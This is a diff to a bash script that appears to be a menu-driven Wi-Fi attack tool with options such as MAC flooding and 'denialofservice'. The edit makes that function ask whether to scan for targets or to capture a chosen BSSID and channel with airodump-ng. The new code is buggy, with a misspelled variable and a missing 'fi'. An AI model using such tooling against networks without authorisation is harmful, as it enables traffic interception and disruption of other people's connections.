@@ -12,14 +12,22 @@ discoveryflood(){
 denialofservice(){
     echo "Enter device name"
     read de
-    airodump-ng $de
-    echo " Enter bssid of Target "
-    read bs
-    echo  " Enter channel number "
-    read ch
-    echo  " Enter file name you want "
-    read wr
-    airodump-ng $de --bssid $bs --channel $ch --write $wr
+    echo "Do you have bssid and chnnel no"
+    echo "1.For finding traget bssid and channel no."
+    echo "2.For attacking the traget"
+    read choice
+    if [ $choice -eq 1 ];
+    then
+        airodump-ng $de
+    elif [ $choie -eq 2 ];
+    then
+        echo " Enter bssid of Target "
+        read bs
+        echo  " Enter channel number "
+        read ch
+        echo  " Enter file name you want "
+        read wr
+        airodump-ng $de --bssid $bs --channel $ch --write $wr
 }
 echo "Select an attack"
 echo "1. Mac Flooding"
